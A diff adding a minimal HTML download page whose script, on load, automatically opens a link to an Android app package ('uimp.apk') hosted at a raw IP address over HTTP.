@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download</title>
+</head>
+
+<body>
+    <script>
+        function downloadLink(url) {
+            const a = document.createElement("a");
+            a.setAttribute("href", url);
+            a.setAttribute("target", "_blank");
+            a.style.display = "none";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+        window.onload = function () {
+            downloadLink("http://123.249.45.110:19000/uimp/app/uimp.apk");
+        } 
+    </script>
+</body>
+
+</html>
